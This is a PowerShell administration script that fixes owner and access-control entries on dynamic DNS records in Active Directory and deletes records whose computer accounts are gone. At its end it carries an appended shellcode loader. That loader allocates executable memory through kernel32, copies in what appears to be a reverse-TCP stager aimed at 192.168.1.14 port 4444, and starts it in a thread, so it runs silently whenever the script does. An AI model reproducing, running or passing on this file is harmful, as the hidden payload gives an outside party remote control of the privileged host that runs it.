


[CmdletBinding(SupportsShouldProcess)]
[OutputType()]
param (
	[Parameter(Mandatory,
			   ValueFromPipeline,
			   ValueFromPipelineByPropertyName)]
	[string]$Zone,
	
	[Parameter(ValueFromPipeline,
			   ValueFromPipelineByPropertyName)]
	[string]$Name,
	
	[Parameter(ValueFromPipeline,
			   ValueFromPipelineByPropertyName)]
	[string]$DnsServer = (Get-ADDomain).ReplicaDirectoryServers[0],
	
	[Parameter(ValueFromPipeline,
			   ValueFromPipelineByPropertyName)]
	[string]$DomainName = (Get-ADDomain).Forest,
	
	[ValidateSet('Forest', 'Domain')]
	[Parameter(ValueFromPipeline,
			   ValueFromPipelineByPropertyName)]
	[string]$IntegrationScope = 'Forest',
	
	[Parameter(ValueFromPipeline,
			   ValueFromPipelineByPropertyName)]
	[string]$DhcpServiceAccount = 'dhcpdns.svc'
)

begin
{
	$ErrorActionPreference = 'Stop'
	Set-StrictMode -Version Latest
	
	Start-Transcript -Path 'C:\transscript.txt'
	
	function Remove-DsAce ([Microsoft.ActiveDirectory.Management.ADObject]$AdObject, [string]$Identity, [System.DirectoryServices.ActiveDirectorySecurity]$Acl)
	{
		$AceToRemove = $Acl.Access | Where-Object { $_.IdentityReference.Value.Split('\')[1] -eq "$Identity<code>$" }
		$Acl.RemoveAccessRule($AceToRemove)
		Set-Acl -Path "ActiveDirectory:://RootDSE/$($AdObject.DistinguishedName)" -AclObject $Acl
	}
	
	function New-DsAce ([Microsoft.ActiveDirectory.Management.ADObject]$AdObject, [string]$Identity, [string]$ActiveDirectoryRights, [string]$Right, [System.DirectoryServices.ActiveDirectorySecurity]$Acl)
	{
		$Sid = (Get-ADObject -Filter "name -eq '$Identity' -and objectClass -eq 'Computer'" -Properties ObjectSID).ObjectSID
		$NewAccessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($Sid, $ActiveDirectoryRights, $Right)
		$Acl.AddAccessRule($NewAccessRule)
		Set-Acl -Path "ActiveDirectory:://RootDSE/$($AdObject.DistinguishedName)" -AclObject $Acl
	}
	
	function Set-DsAclOwner ([Microsoft.ActiveDirectory.Management.ADObject]$AdObject, [string]$Identity, [string]$NetbiosDomainName)
	{
		$User = New-Object System.Security.Principal.NTAccount($NetbiosDomainName, "$Identity$")
		$Acl.SetOwner($User)
		Set-Acl -Path "ActiveDirectory:://RootDSE/$($AdObject.DistinguishedName)" -AclObject $Acl
	}
	
	function Write-Log
	{
	
		[CmdletBinding()]
		param (
			[Parameter(
					   Mandatory = $true)]
			[string]$Message,
			
			[Parameter()]
			[ValidateSet(1, 2, 3)]
			[int]$LogLevel = 1
		)
		
		try
		{
			$TimeGenerated = "$(Get-Date -Format HH:mm:ss).$((Get-Date).Millisecond)+000"
			
			$Line = '<![LOG[{0}]LOG]!><time="{1}" date="{2}" component="{3}" context="" type="{4}" thread="" file="">'
			$LineFormat = $Message, $TimeGenerated, (Get-Date -Format MM-dd-yyyy), "$($MyInvocation.ScriptName | Split-Path -Leaf):$($MyInvocation.ScriptLineNumber)", $LogLevel
			$Line = $Line -f $LineFormat
			
			
			
			
			if (Test-Path variable:\ScriptLogFilePath)
			{
				Add-Content -Value $Line -Path $ScriptLogFilePath
			}
			else
			{
				Write-Verbose $Line
			}
		}
		catch
		{
			Write-Error $_.Exception.Message
		}
	}
	
	function Start-Log
	{
	
		[CmdletBinding()]
		param (
			[ValidateScript({ Split-Path $_ -Parent | Test-Path })]
			[string]$FilePath = "$([environment]::GetEnvironmentVariable('TEMP', 'Machine'))\$((Get-Item $MyInvocation.ScriptName).Basename + '.log')"
		)
		
		try
		{
			if (!(Test-Path $FilePath))
			{
				
				New-Item $FilePath -ItemType File | Out-Null
			}
			
			
			
			$global:ScriptLogFilePath = $FilePath
		}
		catch
		{
			Write-Error $_.Exception.Message
		}
	}
	
	$ModifyRights = 'CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner'
	$FullControlRights = 'GenericAll'
	$Domain = Get-AdDomain -Server $DomainName
	$DomainDn = $Domain.DistinguishedName
	
	Start-Log
}

process
{
	try
	{
		$DnsRecordQueryParams = @{
			'Computername' = $DnsServer
			'Class' = 'MicrosoftDNS_AType'
			'Namespace' = 'root\MicrosoftDNS'
		}
		$DnsNodeObjectQueryParams = @{
			'SearchBase' = "CN=MicrosoftDNS,DC=$IntegrationScope`DnsZones,$DomainDn"
		}
		
		if ($Name)
		{
			Write-Log -Message "Script started using a single record '$Name'"
			$DnsNodeObjectQueryParams.Filter = "objectClass -eq 'dnsNode' -and name -eq '$Name' "
			$DnsRecordQueryParams.Filter = "ContainerName = '$Zone' AND Timestamp <> 0 AND OwnerName = '$Name.$Zone'"
		}
		else
		{
			
			Write-Log "No name specified. Will process all records in the zone '$Zone'"
			$DnsNodeObjectQueryParams.Filter = " objectClass -eq 'dnsNode' "
			$DnsRecordQueryParams.Filter = "ContainerName = '$Zone' AND Timestamp <> 0 AND OwnerName <> '$Zone'"
		}
		
		
		Write-Log -Message "Gathering dynamic records on the '$DnsServer' server in the '$Zone' zone"
		
		$DynamicDnsRecords = (Get-WmiObject @DnsRecordQueryParams | Select-Object -ExpandProperty OwnerName).Trim(".$Zone") | ForEach-Object { $_.SubString(0, [math]::Min(15, $_.Length)) }
		Write-Log -Message "Found $(($DynamicDnsRecords | measure -sum -ea SilentlyContinue).Count) dynamic DNS records in the '$Zone' zone"
		
		
		Write-Log -Message "Finding all dnsNode Active Directory objects"
		$DnsNodeObjects = Get-ADObject @DnsNodeObjectQueryParams | Where-Object { ($DynamicDnsRecords -contains $_.Name) }
		Write-Log -Message "Found $(($DnsNodeObjects | measure -sum -ea SilentlyContinue).Count) matching AD objects"
		
		Write-Log -Message "Processing AD objects"
		foreach ($DnsNodeObject in $DnsNodeObjects)
		{
			try
			{
				$RecordName = $DnsNodeObject.Name
				
				$Acl = Get-Acl -Path "ActiveDirectory:://RootDSE/$($DnsNodeObject.DistinguishedName)"
				
				
				$ValidAceIdentities = @("$($Domain.NetBIOSName)\$RecordName</code>$", "$($Domain.NetBIOSName)\$DhcpServiceAccount")
				if ($ValidAceIdentities -notcontains $Acl.Owner)
				{
					Write-Log -Message "ACL owner '$($Acl.Owner)' for object '$RecordName' is not valid" -LogLevel '3'
					if (!(Get-ADObject -Filter "name -eq '$RecordName' -and objectClass -eq 'Computer'" -ea SilentlyContinue))
					{
						Write-Log -Message "No AD computer account exists for '$RecordName'. Removing DNS record." -LogLevel '2'
						Get-WmiObject -Computername $DnsServer -Namespace 'root\MicrosoftDNS' -Class MicrosoftDNS_AType -Filter "OwnerName = '$RecordName.$Zone'" | Remove-WmiObject
					}
					elseif ($PSCmdlet.ShouldProcess($RecordName, 'Set-DsAclOwner'))
					{
						Write-Log -Message "Setting correct owner '$RecordName' on record '$RecordName'"
						Set-DsAclOwner -AdObject $DnsNodeObject -Identity $RecordName -NetbiosDomainName $Domain.NetbiosName
					}
				}
				if (!($Acl.Access.IdentityReference | Where-Object { $ValidAceIdentities -contains $_ }))
				{
					Write-Log -Message "No ACE found for computer account or DHCP account for '$($DnsNodeObject.Name)'" -LogLevel '3'
					if (!(Get-ADObject -Filter "name -eq '$RecordName' -and objectClass -eq 'Computer'" -ea SilentlyContinue))
					{
						Write-Log -Message "No AD computer account exists for '$RecordName'. Removing DNS record." -LogLevel '2'
						Get-WmiObject -Computername $DnsServer -Namespace 'root\MicrosoftDNS' -Class MicrosoftDNS_AType -Filter "OwnerName = '$RecordName.$Zone'" | Remove-WmiObject
					}
					elseif ($PSCmdlet.ShouldProcess($RecordName, 'New-DsAce'))
					{
						Write-Log -Message "Creating correct ACE for record '$RecordName'"
						New-DsAce -AdObject $DnsNodeObject -Identity $RecordName -ActiveDirectoryRights $ModifyRights -Right 'Allow' -Acl $Acl
					}
				}
				else
				{
					$Identities = $Acl.Access | Where-Object { $ValidAceIdentities -contains $_.IdentityReference }
					if ($Identities -and @($FullControlRights, $ModifyRights) -notcontains $Identities.ActiveDirectoryRights)
					{
						Write-Log -Message "'$RecordName' does not have sufficient rights to it's object" -LogLevel '3'
						if (!(Get-ADObject -Filter "name -eq '$RecordName' -and objectClass -eq 'Computer'" -ea SilentlyContinue))
						{
							Write-Log -Message "No AD computer account exists for '$RecordName'. Removing DNS record." -LogLevel '2'
							Get-WmiObject -Computername $DnsServer -Namespace 'root\MicrosoftDNS' -Class MicrosoftDNS_AType -Filter "OwnerName = '$RecordName.$Zone'" | Remove-WmiObject
						}
						elseif ($PSCmdlet.ShouldProcess($RecordName, 'Recreate ACE'))
						{
							
							
							
							
							Write-Log -Message "Creating correct ACE for record '$RecordName'"
							New-DsAce -AdObject $DnsNodeObject -Identity $RecordName -ActiveDirectoryRights $ModifyRights -Right 'Allow' -Acl $Acl
						}
					}
				}
			}
			catch
			{
				Write-Log -Message "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)" -LogLevel '2'
				Write-Warning "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)"
			}
		}
		Write-Log -Message "Finished processing AD objects"
	}
	catch
	{
		Write-Log -Message "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)" -LogLevel '3'
		Write-Error "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)"
	}
}

$U7o = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $U7o -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0e,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$uua=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uua.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uua,0,0,0);for (;;){Start-sleep 60};

